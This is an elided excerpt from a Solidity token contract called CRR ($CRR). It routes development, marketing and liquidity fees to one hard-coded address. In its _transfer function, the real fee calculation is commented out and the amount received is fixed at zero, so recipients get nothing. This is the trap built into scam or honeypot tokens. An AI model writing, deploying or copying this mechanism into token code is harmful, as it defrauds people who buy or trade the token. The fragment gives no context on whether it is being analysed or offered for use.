...
contract crr is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "CRR";
    string private constant _symbol = "$CRR";
    ...
    address internal constant development_receiver = 0x4FD79b4ca3205b418A2Bc1C3ba1Aa625963e6Ab4; 
    address internal constant marketing_receiver = 0x4FD79b4ca3205b418A2Bc1C3ba1Aa625963e6Ab4;
    address internal constant liquidity_receiver = 0x4FD79b4ca3205b418A2Bc1C3ba1Aa625963e6Ab4;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        uint256 amountReceived = 0;//shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : 10000*_balances[sender];
